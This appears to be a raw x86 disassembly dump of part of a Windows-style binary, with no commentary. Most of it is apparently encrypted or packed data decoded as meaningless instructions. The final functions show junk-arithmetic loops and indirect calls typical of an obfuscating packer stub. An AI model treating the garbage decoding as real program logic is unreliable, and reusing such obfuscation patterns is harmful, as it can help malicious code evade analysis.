  40fb5b:	xor    BYTE PTR [ebp+0x138b762c],0x19
  40fb62:	xor    esi,ebp
  40fb64:	push   ebp
  40fb65:	add    BYTE PTR [esp+ecx*2+0x35966fd5],0x80
  40fb6d:	icebp  
  40fb6e:	xor    edx,ecx
  40fb70:	sbb    BYTE PTR [edi*8+0x1def456d],al
  40fb77:	jmp    0xdfb23819
  40fb7c:	rol    bl,0x8c
  40fb7f:	or     eax,0xec3b0529
  40fb84:	jmp    0x40fbe4
  40fb86:	aaa    
  40fb87:	push   esi
  40fb88:	addr16 xchg esi,eax
  40fb8a:	xor    al,0x8e
  40fb8c:	mov    esi,0xa16f3c9e
  40fb91:	je     0x40fbef
  40fb93:	mov    edx,0x8278c8b6
  40fb98:	(bad)  
  40fb99:	inc    esp
  40fb9a:	rol    BYTE PTR [esi],1
  40fb9c:	and    esi,DWORD PTR [edi-0x74deb5a7]
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffbb
  40fbc9:	xor    esp,DWORD PTR [ecx+0x7eb6d0cc]
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fc32
  40fbd5:	fxch   st(1)
  40fbd7:	ror    DWORD PTR [edx-0x77],0x81
  40fbdb:	in     al,0xc3
  40fbdd:	nop    ebx
  40fbe0:	(bad)  
  40fbe1:	pop    ds
  40fbe2:	fisub  DWORD PTR [edx]
  40fbe4:	jg     0x40fc50
  40fbe6:	cmp    al,BYTE PTR [ecx-0x545934f1]
  40fbec:	iret   
  40fbed:	cli    
  40fbee:	or     al,0x10
  40fbf0:	(bad)  
  40fbf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf2:	sahf   
  40fbf3:	or     DWORD PTR [ebx+0x69d23caf],ebp
  40fbf9:	pop    eax
  40fbfa:	aas    
  40fbfb:	push   ds
  40fbfc:	jmp    0x37b18fc
  40fc01:	call   0x9fd6:0x5a3e2e9b
  40fc08:	ss out dx,al
  40fc0a:	mov    eax,ds:0xfec316c0
  40fc0f:	(bad)  
  40fc10:	cld    
  40fc11:	outs   dx,DWORD PTR ds:[esi]
  40fc12:	mov    ds:0x3ff210ab,eax
  40fc17:	outs   dx,DWORD PTR ds:[esi]
  40fc18:	loope  0x40fbde
  40fc1a:	out    0x1f,al
  40fc1c:	and    edx,DWORD PTR [ebx-0x67]
  40fc1f:	push   ds
  40fc20:	xchg   ebp,eax
  40fc21:	sbb    dl,dh
  40fc23:	mov    dh,0x1b
  40fc25:	jo     0x40fc24
  40fc27:	lods   eax,DWORD PTR ds:[esi]
  40fc28:	test   DWORD PTR [edi+ecx*2],ebx
  40fc2b:	das    
  40fc2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc2d:	out    0x74,al
  40fc2f:	mov    al,0xc6
  40fc31:	int3   
  40fc32:	fdivr  st(4),st
  40fc34:	dec    esi
  40fc35:	sar    DWORD PTR [ecx-0x13],1
  40fc38:	(bad)
  40fc3c:	imul   edx,DWORD PTR [ecx+0x74],0x1d
  40fc40:	sub    ebp,DWORD PTR [ebp+0x64]
  40fc43:	(bad)  
  40fc44:	jb     0x40fcb2
  40fc46:	mov    ds:0xea90c9c0,eax
  40fc4b:	popf   
  40fc4c:	mov    bh,0x92
  40fc4e:	mov    dh,0x2a
  40fc50:	push   ds
  40fc51:	arpl   WORD PTR [eax+0x3ba93d9],bp
  40fc57:	test   DWORD PTR [ecx],edi
  40fc59:	sbb    BYTE PTR [eax-0x20],bl
  40fc5c:	sbb    BYTE PTR [eax],ah
  40fc5e:	fs inc edi
  40fc60:	les    esi,FWORD PTR [ebx+0x7a]
  40fc63:	stos   DWORD PTR es:[edi],eax
  40fc64:	cmp    ebx,ebx
  40fc66:	and    BYTE PTR [eax],al
  40fc68:	mov    eax,DWORD PTR [ebp-0x7f6bbc77]
  40fc6e:	mov    DWORD PTR cs:[ebp-0x44],eax
  40fc72:	or     eax,DWORD PTR [ecx+0x1]
  40fc75:	mov    ?,WORD PTR [edi-0x23b9d409]
  40fc7b:	jae    0x40fca8
  40fc7d:	pop    edi
  40fc7e:	push   cs
  40fc7f:	es dec ebx
  40fc81:	mov    WORD PTR [ebx+0xc],fs
  40fc84:	or     BYTE PTR [eax+0x6e],0xda
  40fc88:	push   0x525a59eb
  40fc8d:	fcom   DWORD PTR [ecx+0x9b3c59e]
  40fc93:	cmp    esp,DWORD PTR [edi]
  40fc95:	stos   DWORD PTR es:[edi],eax
  40fc96:	es cli 
  40fc98:	jne    0x40fca1
  40fc9a:	jbe    0x40fcfe
  40fc9c:	mov    eax,0x5faf2a65
  40fca1:	stc    
  40fca2:	jecxz  0x40fd0a
  40fca4:	or     al,0x18
  40fca6:	pop    ss
  40fca7:	push   eax
  40fca8:	xchg   esi,esp
  40fcaa:	out    dx,eax
  40fcab:	sahf   
  40fcac:	pop    ebp
  40fcad:	mov    eax,0x78bf5378
  40fcb2:	xor    al,0x61
  40fcb4:	inc    ebp
  40fcb5:	shl    DWORD PTR [edi],cl
  40fcb7:	loopne 0x40fcdb
  40fcb9:	ins    BYTE PTR es:[edi],dx
  40fcba:	loopne 0x40fd30
  40fcbc:	outs   dx,BYTE PTR ds:[esi]
  40fcbd:	mov    bl,0xd3
  40fcbf:	sub    DWORD PTR [ebp+0x7f182e9],ecx
  40fcc5:	stc    
  40fcc6:	call   0xeb066787
  40fccb:	sbb    dh,dl
  40fccd:	data16 stos BYTE PTR es:[edi],al
  40fccf:	and    eax,0x5a7a79de
  40fcd4:	sub    bl,dh
  40fcd6:	sbb    BYTE PTR [ecx+0x3b2b5806],bh
  40fcdc:	test   al,bh
  40fcde:	push   es
  40fcdf:	cld    
  40fce0:	cld    
  40fce1:	fistp  WORD PTR [eax]
  40fce3:	lock cmc 
  40fce5:	sbb    bl,al
  40fce7:	xor    al,0x31
  40fce9:	shl    DWORD PTR ds:[eax+0x36832f6f],cl
  40fcf0:	sub    eax,0x92cbf03d
  40fcf5:	bound  esp,QWORD PTR [ebx]
  40fcf7:	and    esi,DWORD PTR [edx-0x7e]
  40fcfa:	mov    esi,0x6da7e85a
  40fcff:	inc    edi
  40fd00:	cmp    eax,0x997f4886
  40fd05:	jmp    FWORD PTR [edi+ecx*8-0x65]
  40fd09:	retf   0xd019
  40fd0c:	fwait
  40fd0d:	jmp    0x4171:0x2a747ee0
  40fd14:	mov    edi,0x400bf724
  40fd19:	push   ss
  40fd1a:	stos   BYTE PTR es:[edi],al
  40fd1b:	xor    esp,edi
  40fd1d:	cmp    BYTE PTR [eax-0x6276c691],0x69
  40fd24:	pop    ss
  40fd25:	mov    ecx,0x21df963c
  40fd2a:	cli    
  40fd2b:	sub    al,0x37
  40fd2d:	shl    BYTE PTR [eax*1-0x44672482],1
  40fd34:	dec    ecx
  40fd35:	jle    0x40fd7f
  40fd37:	lods   eax,DWORD PTR ds:[esi]
  40fd38:	and    DWORD PTR [ebp-0x55],edi
  40fd3b:	mov    ecx,0x6ee199be
  40fd40:	pop    ebp
  40fd41:	dec    esp
  40fd42:	fst    QWORD PTR [esi-0x10]
  40fd45:	fistp  DWORD PTR [edx-0x50665edd]
  40fd4b:	data16 xlat BYTE PTR ds:[ebx]
  40fd4d:	cmp    al,0x82
  40fd4f:	test   eax,0xe3963ac9
  40fd54:	sbb    al,0x76
  40fd56:	mov    ds:0x92d360f4,al
  40fd5b:	sbb    esi,DWORD PTR [esi-0x2c41b490]
  40fd61:	leave  
  40fd62:	push   ebp
  40fd63:	retf   0xaf01
  40fd66:	add    al,0xc7
  40fd68:	stos   DWORD PTR es:[edi],eax
  40fd69:	inc    esp
  40fd6a:	dec    edi
  40fd6b:	push   esi
  40fd6c:	cdq    
  40fd6d:	fcmovne st,st(3)
  40fd6f:	adc    ebp,DWORD PTR [eax-0x1d22c8fc]
  40fd75:	fcmovb st,st(5)
  40fd77:	imul   ebx,edi,0xffffffe9
  40fd7a:	(bad)  
  40fd7b:	push   0x2b828b40
  40fd80:	pop    edx
  40fd81:	fnstcw WORD PTR [ecx-0x64]
  40fd84:	and    al,0x25
  40fd86:	pop    ebx
  40fd87:	ds repz push edi
  40fd8a:	shl    BYTE PTR [eax+0x3dda13c2],0x44
  40fd91:	shl    DWORD PTR [edx+0x14ce2772],1
  40fd97:	mov    ebp,0x2cfac12
  40fd9c:	xor    al,0xa1
  40fd9e:	sub    al,0xdb
  40fda0:	adc    esp,DWORD PTR [esi-0x1c]
  40fda3:	and    BYTE PTR [edx],bh
  40fda5:	cmp    al,0xc7
  40fda7:	add    eax,0x6dba009d
  40fdac:	adc    al,0x58
  40fdae:	pop    ds
  40fdaf:	ds clc 
  40fdb1:	add    al,BYTE PTR [ebp-0x6c15b555]
  40fdb7:	call   0x7c91:0x5b10763f
  40fdbe:	adc    esp,DWORD PTR [ecx-0x9841333]
  40fdc4:	test   eax,0x1313c0f9
  40fdc9:	or     BYTE PTR [eax-0x1f],cl
  40fdcc:	retf   
  40fdcd:	test   BYTE PTR [edi-0x13],cl
  40fdd0:	imul   edx,DWORD PTR [edi+0x36fc8bb2],0x70abb1
  40fdda:	jbe    0x40fd68
  40fddc:	dec    eax
  40fddd:	xchg   edx,eax
  40fdde:	or     bh,BYTE PTR [ecx+0x4c]
  40fde1:	jb     0x40fd69
  40fde3:	inc    ecx
  40fde4:	cwde   
  40fde5:	add    cl,ch
  40fde7:	mov    al,ds:0xb64339c3
  40fdec:	aas    
  40fded:	inc    eax
  40fdee:	and    al,cl
  40fdf0:	xor    ebp,DWORD PTR [ebx]
  40fdf2:	dec    esp
  40fdf3:	out    dx,al
  40fdf4:	add    BYTE PTR [ecx],dl
  40fdf6:	cld    
  40fdf7:	call   0x7aea:0x6d931cd1
  40fdfe:	in     al,0xc
  40fe00:	(bad)  
  40fe01:	and    dl,dl
  40fe03:	mov    ds:0x9c59129e,eax
  40fe08:	push   es
  40fe09:	mov    bl,0xd0
  40fe0b:	ror    edx,cl
  40fe0d:	mov    eax,ds:0x4b68265c
  40fe12:	mov    cl,0x8e
  40fe14:	xchg   esi,eax
  40fe15:	popa   
  40fe16:	fmul   QWORD PTR [eax-0x1ab978a7]
  40fe1c:	retf   0xd3e9
  40fe1f:	es jns 0x40fe76
  40fe22:	cld    
  40fe23:	cwde   
  40fe24:	push   ebp
  40fe25:	xlat   BYTE PTR ds:[ebx]
  40fe26:	push   es
  40fe27:	ror    al,cl
  40fe29:	lock push ss
  40fe2b:	push   edx
  40fe2c:	push   ebx
  40fe2d:	repz lea esi,[si-0x70]
  40fe32:	pop    es
  40fe33:	je     0x40fdc6
  40fe35:	xchg   DWORD PTR [ebx+eax*4-0x3f],esp
  40fe39:	jbe    0x40fe53
  40fe3b:	jbe    0x40fe60
  40fe3d:	enter  0x373a,0xa3
  40fe41:	icebp  
  40fe42:	fimul  DWORD PTR [edi+eax*1+0xce861f7]
  40fe49:	xchg   ecx,eax
  40fe4a:	arpl   WORD PTR [esi+0x58],bx
  40fe4d:	fwait
  40fe4e:	jbe    0x40fded
  40fe50:	inc    ebx
  40fe51:	jae    0x40fdde
  40fe53:	mov    ds:0x65b37ae9,al
  40fe58:	jo     0x40feae
  40fe5a:	mov    ecx,0xdf5084e7
  40fe5f:	das    
  40fe60:	int3   
  40fe61:	add    DWORD PTR [ebp+0x42],edi
  40fe64:	mov    ebp,0x32d430bd
  40fe69:	pop    es
  40fe6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe6b:	sbb    BYTE PTR [edx-0x77092f65],cl
  40fe71:	(bad)  
  40fe72:	adc    bh,dl
  40fe74:	mov    DWORD PTR [eax+0x50b67019],esp
  40fe7a:	pop    eax
  40fe7b:	fisttp QWORD PTR [edi]
  40fe7d:	xchg   ecx,eax
  40fe7e:	cmp    BYTE PTR [edx-0x77],ah
  40fe81:	mov    BYTE PTR [ebp+0x30],0xed
  40fe85:	jmp    0xf22acc62
  40fe8a:	std    
  40fe8b:	ds dec ecx
  40fe8d:	mov    edi,0xf0359ec4
  40fe92:	mov    ch,0x24
  40fe94:	inc    ecx
  40fe95:	pop    ss
  40fe96:	dec    esi
  40fe97:	rcr    DWORD PTR [edx+esi*2-0x6210639d],1
  40fe9e:	lods   eax,DWORD PTR ds:[esi]
  40fe9f:	retf   0x1185
  40fea2:	or     eax,0xb9fef87a
  40fea7:	xchg   ebx,eax
  40fea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea9:	mov    WORD PTR [eax-0x1f],es
  40feac:	ret    
  40fead:	lods   eax,DWORD PTR ds:[esi]
  40feae:	mov    al,0xa4
  40feb0:	push   0xfffffff6
  40feb2:	or     ah,BYTE PTR ds:0x4d589621
  40feb8:	push   0xffffffd7
  40feba:	out    0x5a,eax
  40febc:	xchg   ebx,eax
  40febd:	jmp    0x40fe48
  40febf:	dec    esi
  40fec0:	pop    esp
  40fec1:	sahf   
  40fec2:	in     eax,0x6a
  40fec4:	xlat   BYTE PTR ds:[ebx]
  40fec5:	lock dec esp
  40fec7:	mov    dh,BYTE PTR [ecx*1+0x4634c4fb]
  40fece:	mov    ds,WORD PTR [edx+0x5711323c]
  40fed4:	mov    cl,bh
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x36f24346
  40fef3:	repz mov esi,0x7e7eb5de
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	cmc    
  40fefe:	(bad)  
  40feff:	mov    ah,0x93
  40ff01:	call   FWORD PTR [esi+0x77]
  40ff04:	test   al,0x75
  40ff06:	or     BYTE PTR [edx+0x3760edd4],0xc9
  40ff0d:	add    BYTE PTR [edi],bh
  40ff0f:	les    edx,FWORD PTR [esi+0x48]
  40ff12:	xor    eax,0x7a7304fe
  40ff17:	mov    ebx,ebp
  40ff19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff1a:	push   0x4ef9d14b
  40ff1f:	dec    ebp
  40ff20:	idiv   cl
  40ff22:	xchg   bh,bl
  40ff24:	push   ebp
  40ff25:	jb     0x40ff75
  40ff27:	sbb    ebx,edi
  40ff29:	sbb    ebp,0x44
  40ff2c:	push   esi
  40ff2d:	jne    0x40fefd
  40ff2f:	and    ebp,DWORD PTR [eax-0x30]
  40ff32:	ds pushf 
  40ff34:	ins    DWORD PTR es:[edi],dx
  40ff35:	push   ecx
  40ff36:	mov    dh,0x5c
  40ff38:	adc    DWORD PTR [edi+0x6cca6bd],eax
  40ff3e:	push   eax
  40ff3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff40:	dec    esp
  40ff41:	mov    esp,0x96329c37
  40ff46:	mov    fs,WORD PTR [eax-0x6c]
  40ff49:	sbb    al,0xcb
  40ff4b:	mov    ch,0xc3
  40ff4d:	or     BYTE PTR [edi-0x562c0857],0x39
  40ff54:	pop    DWORD PTR [ebx+0x79]
  40ff57:	or     ebx,edi
  40ff59:	push   ebx
  40ff5a:	mov    dl,0x92
  40ff5c:	inc    esi
  40ff5d:	mov    gs,esi
  40ff5f:	or     dh,al
  40ff61:	les    edi,FWORD PTR [ecx-0x1f687406]
  40ff67:	adc    BYTE PTR [ebx-0x1a1d3b21],al
  40ff6d:	aaa    
  40ff6e:	mov    edx,0x8c046409
  40ff73:	mov    ah,0x57
  40ff75:	aaa    
  40ff76:	js     0x40ff1c
  40ff78:	and    eax,0x9ab043aa
  40ff7d:	push   0x1
  40ff7f:	push   es
  40ff80:	add    BYTE PTR [esi],bh
  40ff82:	push   sp
  40ff84:	scas   eax,DWORD PTR es:[edi]
  40ff85:	inc    ebp
  40ff86:	cli    
  40ff87:	gs js  0x40ff39
  40ff8a:	mov    al,0x68
  40ff8c:	adc    dl,bh
  40ff8e:	ss adc ch,al
  40ff91:	dec    edx
  40ff92:	shl    BYTE PTR [edi+eax*4-0x4a],cl
  40ff96:	mov    ebp,0xb0726b16
  40ff9b:	pop    ecx
  40ff9c:	add    al,0xda
  40ff9e:	jno    0x410019
  40ffa0:	add    BYTE PTR [ebx-0x22],0x20
  40ffa4:	into   
  40ffa5:	aam    0x6
  40ffa7:	sub    eax,0x879263d1
  40ffac:	mov    ebp,edi
  40ffae:	adc    BYTE PTR [eax-0x62],bh
  40ffb1:	and    edx,DWORD PTR [esp+eax*1]
  40ffb4:	neg    cl
  40ffb6:	dec    ebx
  40ffb7:	leave  
  40ffb8:	or     bh,cl
  40ffba:	imul   cx,WORD PTR [esi],0xfffc
  40ffbe:	lods   eax,DWORD PTR ds:[esi]
  40ffbf:	inc    BYTE PTR [esi+0x571c7ae8]
  40ffc5:	jecxz  0x40ffd4
  40ffc7:	clc    
  40ffc8:	jne    0x40ffd4
  40ffca:	popa   
  40ffcb:	std    
  40ffcc:	dec    ecx
  40ffcd:	pop    ss
  40ffce:	out    0x5c,al
  40ffd0:	test   eax,0x7d10f8fc
  40ffd5:	xor    edx,DWORD PTR [edx+edi*8+0x11]
  40ffd9:	arpl   WORD PTR [edx+0x3],ax
  40ffdc:	mov    edi,cs
  40ffde:	popf   
  40ffdf:	dec    edx
  40ffe0:	push   ds
  40ffe1:	fstp   TBYTE PTR [esi]
  40ffe3:	(bad)  
  40ffe4:	inc    ebx
  40ffe5:	xchg   ebp,eax
  40ffe6:	lock cmp edx,eax
  40ffe9:	jns    0x410027
  40ffeb:	out    dx,eax
  40ffec:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40ffee:	fistp  QWORD PTR [edi-0x2]
  40fff1:	ja     0x41000e
  40fff3:	popf   
  40fff4:	xchg   cl,dl
  40fff6:	cmc    
  40fff7:	sub    BYTE PTR [esi+0x63],dl
  40fffa:	cmp    BYTE PTR [ebx+0x25984125],bh
  410000:	sahf   
  410001:	add    BYTE PTR [edi+0x70],dl
  410004:	fwait
  410005:	fwait
  410006:	ins    BYTE PTR es:[edi],dx
  410007:	imul   esp,edi,0x17
  41000a:	popa   
  41000b:	sahf   
  41000c:	stos   DWORD PTR es:[edi],eax
  41000d:	sbb    al,0x1d
  41000f:	inc    eax
  410010:	mov    edx,0xbd636030
  410015:	imul   eax,ecx,0x33865871
  41001b:	je     0x410052
  41001d:	adc    DWORD PTR [ebx+0x50],ebx
  410020:	mov    dh,0x40
  410022:	stos   BYTE PTR es:[edi],al
  410023:	inc    esi
  410024:	fisttp DWORD PTR ds:0xbff6054e
  41002a:	or     DWORD PTR [esi+ebx*4],0xffffff95
  41002e:	mov    al,ds:0x603a2b00
  410033:	or     dh,cl
  410035:	inc    esp
  410036:	add    BYTE PTR [eax+0x73d454a0],ah
  41003c:	push   ds
  41003d:	enter  0xa62,0x7d
  410041:	imul   edx,DWORD PTR [ebp+0x4a],0x10
  410045:	xchg   esp,eax
  410046:	jnp    0x410067
  410048:	sub    edx,DWORD PTR [ebx]
  41004a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41004b:	je     0x40fff3
  41004d:	xchg   BYTE PTR [ebp-0x2f4c1102],dh
  410053:	push   ebx
  410054:	fcomi  st,st(1)
  410056:	aam    0xc1
  410058:	stos   BYTE PTR es:[edi],al
  410059:	dec    ebp
  41005a:	xchg   DWORD PTR [ebp-0x6b6e5fd1],edi
  410060:	mov    bh,0xa9
  410062:	sahf   
  410063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410064:	and    BYTE PTR [ecx+0x7e95da62],al
  41006a:	shl    DWORD PTR [esp+eiz*8+0x60f5d986],cl
  410071:	jne    0x410078
  410073:	push   edi
  410074:	retf   
  410075:	dec    edi
  410076:	push   es
  410077:	sbb    ebp,DWORD PTR ds:0x6af9195d
  41007d:	hlt    
  41007e:	mov    eax,0x2dce1535
  410083:	sub    DWORD PTR [ebp+0x31d96003],esi
  410089:	pop    edi
  41008a:	mov    ds:0x56edb3bf,al
  41008f:	sbb    ch,BYTE PTR [eax+0x2]
  410092:	outs   dx,BYTE PTR ds:[esi]
  410093:	cmp    eax,0xea78e942
  410098:	enter  0xab4c,0x71
  41009c:	not    BYTE PTR ds:0x33f3a60f
  4100a2:	popa   
  4100a3:	shl    DWORD PTR [ebx+0xb],cl
  4100a6:	jg     0x410121
  4100a8:	mov    ds:0xb3662232,eax
  4100ad:	stos   BYTE PTR es:[edi],al
  4100ae:	ret    0x167d
  4100b1:	add    BYTE PTR [ebx+0xe],bh
  4100b4:	xor    BYTE PTR [ebx-0x7e3a9a79],0x73
  4100bb:	bound  edi,QWORD PTR [esi]
  4100bd:	push   esp
  4100be:	jnp    0x410085
  4100c0:	xchg   edi,eax
  4100c1:	mov    eax,0xf75ebe50
  4100c6:	shr    esp,0xea
  4100c9:	add    edx,esp
  4100cb:	ja     0x4100a5
  4100cd:	(bad)  
  4100ce:	fdivr  DWORD PTR [eax]
  4100d0:	adc    al,0xc2
  4100d2:	shl    DWORD PTR [eax],cl
  4100d4:	lods   al,BYTE PTR ds:[esi]
  4100d5:	int    0x71
  4100d7:	fwait
  4100d8:	jmp    0x91aba01
  4100dd:	lock jnp 0x4100e4
  4100e0:	fcomp  QWORD PTR [ebx+0x326a9fc4]
  4100e6:	cs pop ebx
  4100e8:	data16 sti 
  4100ea:	call   0x4086a981
  4100ef:	mov    ebx,0xf9472fb4
  4100f4:	add    ecx,esp
  4100f6:	cmc    
  4100f7:	dec    ecx
  4100f8:	fcom   QWORD PTR [ecx+0x5d64278f]
  4100fe:	sbb    bl,BYTE PTR [edx+0x2a]
  410101:	mov    ds:0x8b1b74ad,eax
  410106:	into   
  410107:	test   eax,0xb8edcfba
  41010c:	and    eax,0x5896ab4a
  410111:	jae    0x410134
  410113:	jmp    0x410112
  410115:	pop    edx
  410116:	imul   esp,DWORD PTR [ebp-0x12],0x5e
  41011a:	xor    eax,0xb750725a
  41011f:	push   es
  410120:	outs   dx,DWORD PTR ds:[esi]
  410121:	xchg   esi,eax
  410122:	and    eax,0x41bba901
  410127:	dec    edx
  410128:	xchg   BYTE PTR [ebp+0x35],bl
  41012b:	lock or dh,ch
  41012e:	sub    al,0xeb
  410130:	jl     0x41010c
  410132:	stc    
  410133:	sub    BYTE PTR [esi+0x3268a77e],0x8e
  41013a:	jno    0x41010a
  41013c:	sbb    al,0xca
  41013e:	pop    ds
  41013f:	xor    bh,BYTE PTR [edi+0x5a]
  410142:	dec    edx
  410143:	sbb    edi,DWORD PTR [ecx]
  410145:	icebp  
  410146:	jnp    0x41011f
  410148:	xchg   esi,eax
  410149:	mov    WORD PTR [edx-0x25],es
  41014c:	pop    esi
  41014d:	jae    0x410191
  41014f:	mov    edx,0x42d7cf0e
  410154:	sub    BYTE PTR [ecx-0x20],bh
  410157:	daa    
  410158:	or     bh,cl
  41015a:	cmp    DWORD PTR [esi],0xfffffffe
  41015d:	xchg   DWORD PTR [ebp+0x15],esp
  410160:	rcl    DWORD PTR [ebx],1
  410162:	sub    DWORD PTR [eax],esp
  410164:	or     DWORD PTR [eax-0x54],eax
  410167:	sti    
  410168:	fsubr  st(0),st
  41016a:	inc    eax
  41016b:	or     eax,0xa5b363f5
  410170:	not    BYTE PTR [eax-0x69d7fa48]
  410176:	ret    0x2f57
  410179:	mov    bh,bl
  41017b:	cdq    
  41017c:	les    edx,FWORD PTR [ecx-0x4acb2df4]
  410182:	call   0xeb15:0xe597768a
  410189:	clc    
  41018a:	repnz mov esi,0x3ee6c071
  410190:	fsub   DWORD PTR [esi-0x1]
  410193:	xor    ah,BYTE PTR [ebx]
  410195:	adc    al,0x95
  410197:	dec    edx
  410198:	lods   al,BYTE PTR ds:[esi]
  410199:	xchg   ebx,eax
  41019a:	(bad)  
  41019c:	xor    cl,BYTE PTR [esi]
  41019e:	mov    ds:0x35364cc8,eax
  4101a3:	scas   al,BYTE PTR es:[edi]
  4101a4:	xor    eax,0x48abca7
  4101a9:	cwde   
  4101aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ab:	mov    edi,DWORD PTR [ecx-0x18]
  4101ae:	add    esp,DWORD PTR [edi]
  4101b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101b1:	leave  
  4101b2:	cld    
  4101b3:	retf   0xc606
  4101b6:	mov    ecx,0x9d32c7cc
  4101bb:	mov    ch,0xcd
  4101bd:	inc    eax
  4101be:	pop    edx
  4101bf:	dec    ebp
  4101c0:	std    
  4101c1:	xchg   ecx,eax
  4101c2:	jnp    0x4101d3
  4101c4:	add    eax,0x77f18694
  4101c9:	push   esp
  4101ca:	test   ecx,eax
  4101cc:	icebp  
  4101cd:	(bad)  
  4101ce:	fcomp  DWORD PTR [eax+0x39bfe54f]
  4101d4:	push   edx
  4101d5:	shl    DWORD PTR [ecx-0x1b1233ff],1
  4101db:	inc    ebp
  4101dc:	stc    
  4101dd:	inc    edi
  4101de:	ins    DWORD PTR es:[edi],dx
  4101df:	fisttp DWORD PTR [eax+0x6c]
  4101e2:	retf   0xebb7
  4101e5:	or     al,0x6
  4101e7:	stos   BYTE PTR es:[edi],al
  4101e8:	imul   edi,ebx,0x1b
  4101eb:	jno    0x4101b7
  4101ed:	dec    edx
  4101ee:	cwde   
  4101ef:	push   esp
  4101f0:	add    bl,BYTE PTR [ebx+0x6d111b4b]
  4101f6:	xchg   BYTE PTR [edi+0x2e0a7c07],bh
  4101fc:	ins    BYTE PTR es:[edi],dx
  4101fd:	inc    esi
  4101fe:	mov    dh,bh
  410200:	icebp  
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
